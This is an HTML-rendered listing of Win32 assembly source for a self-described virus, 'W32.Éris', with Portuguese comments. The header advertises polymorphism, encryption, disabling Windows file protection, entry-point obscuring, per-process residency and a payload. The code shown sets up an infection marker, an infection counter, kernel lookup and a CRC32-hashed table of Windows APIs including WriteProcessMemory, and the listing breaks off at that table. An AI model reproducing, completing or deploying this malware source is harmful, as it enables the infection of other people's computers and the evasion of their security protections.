<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>eris.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
	background: #FFFFCC;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                   W32.Éris by cH4R_</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;              http://www.charvx.cjb.net</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Compile com:</span><span class="sc0">
</span><span class="sc1">; TASM32.EXE /i\TASM\INCLUDE /m9 /ml gremory.asm,,;</span><span class="sc0">
</span><span class="sc1">; TLINK32.EXE /Tpe /aa gremory.obj,gremory.exe,,import32.lib</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; - Multiplataforma (Win95/98/98SE/NT/2K/XP Home &amp; Pro)</span><span class="sc0">
</span><span class="sc1">; - Busca de APIs por CRC32</span><span class="sc0">
</span><span class="sc1">; - Anti-SFC - Desativa SFC no WinXP (SP1)</span><span class="sc0">
</span><span class="sc1">; - Criptografia (pega chave por meio de hashing)</span><span class="sc0">
</span><span class="sc1">; - Polimorfismo</span><span class="sc0">
</span><span class="sc1">; - Payload ;D</span><span class="sc0">
</span><span class="sc1">; - Per-Process Residency</span><span class="sc0">
</span><span class="sc1">; - Entry-Point Obscuring (usando RGBLDE)</span><span class="sc0">
</span><span class="sc1">; - Structured Exception Handling</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Obrigado a / Thanks to:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Djinn - you know... i love you ;*</span><span class="sc0">
</span><span class="sc1">; roy g biv - Excellent LDE :D</span><span class="sc0">
</span><span class="sc1">; Billy - Good tutorial (per-process), Excellent virus (Kriz)</span><span class="sc0">
</span><span class="sc1">; Benny - Excellent tutorial (optimization), good virus (HIV)</span><span class="sc0">
</span><span class="sc1">; ancev - Vc estava certo, um engine poly cai mto bem. :P</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">

</span><span class="sc2">.586</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                  INCLUDES E FALSAS IMPORTAÇÕES</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PE.INC</span><span class="sc0">         </span><span class="sc1">; Include da 29A</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">MZ.INC</span><span class="sc0">         </span><span class="sc1">; Include da 29A</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;             ABREVIATURAS &amp; MACROZ &amp; DEFINIÇÕES</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CRLF</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
</span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">
</span><span class="sc5">wod</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">x</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">; Tamanho de todo o código viral</span><span class="sc0">
</span><span class="sc5">n_Eris</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Eris_Fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Eris</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">; Tamanho da area do virus que pode ser encriptada pelo decriptador complexo</span><span class="sc0">
</span><span class="sc5">n_Area</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Area_Fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Area</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">; Tamanho da area do decriptador complexo</span><span class="sc0">
</span><span class="sc5">n_Comp</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">Eris_Fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">DeCrypt</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">; Tamanho da area do decriptador polimorfico</span><span class="sc0">
</span><span class="sc5">n_Simp</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">DeCrypt</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">S_Dec</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">; Tamanho maximo do decriptador polimorfico + decriptador complexo</span><span class="sc0">
</span><span class="sc5">n_PMax</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">n_Comp</span><span class="sc4">+</span><span class="sc5">n_Simp</span><span class="sc0">
</span><span class="sc1">; Número de APIs</span><span class="sc0">
</span><span class="sc5">n_APIs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_APIs_fim</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_APIs</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">; Marca de infecção (Éris)</span><span class="sc0">
</span><span class="sc5">marca</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc3">"sirÉ"</span><span class="sc0">

</span><span class="sc1">; ---- Macro de SEH (by Jack Qwerty) ----</span><span class="sc0">

</span><span class="sc5">pseh</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">what2do</span><span class="sc0">
</span><span class="sc9">local</span><span class="sc0"> </span><span class="sc5">@@over_seh_handler</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@over_seh_handler</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">what2do</span><span class="sc0">
</span><span class="sc5">@@over_seh_handler</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">rseh</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">; ---- Parametros de APIs ----</span><span class="sc0">

</span><span class="sc5">DRIVE_REMOVABLE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">DRIVE_FIXED</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">DRIVE_REMOTE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">MEM_COMMIT_RESERVE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03000h</span><span class="sc0">
</span><span class="sc5">MEM_RELEASE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">08000h</span><span class="sc0">

</span><span class="sc5">CREATE_NEW</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">OPEN_ALWAYS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FILE_BEGIN</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FILE_CURRENT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FILE_END</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">PROCESS_VM_WRITE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">

</span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4h</span><span class="sc0">

</span><span class="sc1">; ---- Estruturas ----</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">wYear</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMonth</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wDayOfWeek</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wDay</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wHour</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMinute</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wSecond</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMilliseconds</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">SZ_SYSTEMTIME</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">SYSTEMTIME</span><span class="sc0">

</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0"> </span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">eWFD_dwReserved0</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">104h</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">SZ_WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">

</span><span class="sc5">OSVERSIONINFO</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">dwOSVersionInfoSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwMajorVersion</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwMinorVersion</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwBuildNumber</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dwPlatformId</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">szCSDVersion</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OSVERSIONINFO</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">SZ_OSVERSIONINFO</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">OSVERSIONINFO</span><span class="sc0">

</span><span class="sc5">STACK_REG</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
</span><span class="sc5">_EDI</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_ESI</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_EBP</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_ESP</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_EBX</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_EDX</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_ECX</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_EAX</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">STACK_REG</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc5">STACK_REGS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">STACK_REG</span><span class="sc0">
</span><span class="sc5">REGS_FLAGS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">STACK_REGS</span><span class="sc4">+</span><span class="sc2">4h</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                   Seções da primeira geração</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">inicio</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; AL = 0</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">         </span><span class="sc1">; AL = 0FFh (maximo de infecções na primeira geração)</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Eris</span><span class="sc0">      </span><span class="sc1">; Éris - A deusa da discordia... ;)</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; arg 0 = return to call</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; arg 1 = exit code</span><span class="sc0">

           </span><span class="sc1">; &lt;-- o tasm colocará jump p/ ExitProcess aqui ;)</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                       Seção do Éris</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">newsection</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'Éris'</span><span class="sc0">

</span><span class="sc5">Eris</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Area</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ---- Delta-Offset ----</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta_Offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infec_max</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Maximo de infecções = AL</span><span class="sc0">

</span><span class="sc1">; ---- Localiza Kernel ----</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ProcuraKrn</span><span class="sc0">                </span><span class="sc1">; Procura kernel :D</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">termina_tudo</span><span class="sc0">               </span><span class="sc1">; EAX != 0 ? Então vaza...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; Salva endereço</span><span class="sc0">

</span><span class="sc1">; ---- Localiza APIs ----</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">n_APIs</span><span class="sc0">       </span><span class="sc1">; Numéro de APIs</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_APIs_fim</span><span class="sc0">    </span><span class="sc1">; Salta tabela de CRC32's</span><span class="sc0">

</span><span class="sc5">_APIs</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0B09315F4h</span><span class="sc0">  </span><span class="sc1">; CloseHandle</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0553B5C78h</span><span class="sc0">  </span><span class="sc1">; CreateFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0D9AC2453h</span><span class="sc0">  </span><span class="sc1">; CreateMutexA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0D82BF69Ah</span><span class="sc0">  </span><span class="sc1">; FindClose</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C9EBD5CEh</span><span class="sc0">  </span><span class="sc1">; FindFirstFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">075272948h</span><span class="sc0">  </span><span class="sc1">; FindNextFileA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0DA68238Fh</span><span class="sc0">  </span><span class="sc1">; FreeLibrary</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C79DC4E3h</span><span class="sc0">  </span><span class="sc1">; GetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0D0861AA4h</span><span class="sc0">  </span><span class="sc1">; GetCurrentProcess</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0F6A56750h</span><span class="sc0">  </span><span class="sc1">; GetDriveTypeA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">030601C1Ch</span><span class="sc0">  </span><span class="sc1">; GetFileAttributesA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0B1866570h</span><span class="sc0">  </span><span class="sc1">; GetModuleHandleA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0C97C1FFFh</span><span class="sc0">  </span><span class="sc1">; GetProcAddress</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">086B0A95Ah</span><span class="sc0">  </span><span class="sc1">; GetSystemDirectoryA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0D22204E4h</span><span class="sc0">  </span><span class="sc1">; GetSystemTime</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0DF87764Ah</span><span class="sc0">  </span><span class="sc1">; GetVersionExA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0FFF372BEh</span><span class="sc0">  </span><span class="sc1">; GetWindowsDirectoryA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">03FC1BD8Dh</span><span class="sc0">  </span><span class="sc1">; LoadLibraryA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0095C03D0h</span><span class="sc0">  </span><span class="sc1">; ReadFile</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">069B6849Fh</span><span class="sc0">  </span><span class="sc1">; SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0156B9702h</span><span class="sc0">  </span><span class="sc1">; SetFileAttributesA</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0EFC7EA74h</span><span class="sc0">  </span><span class="sc1">; SetFilePointer</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">009CE0D4Ah</span><span class="sc0">  </span><span class="sc1">; VirtualAlloc</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0CD53F5DDh</span><span class="sc0">  </span><span class="sc1">; VirtualFree</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">010066F2Fh</span><span class="sc0">  </span><span class="sc1">; VirtualProtect</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0CCE95612h</span><span class="sc0">  </span><span class="sc1">; WriteFile</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04F58972Eh</span><span class="sc0">  </span><span class="sc1">; WriteProcessMemory</span><span class="sc0">
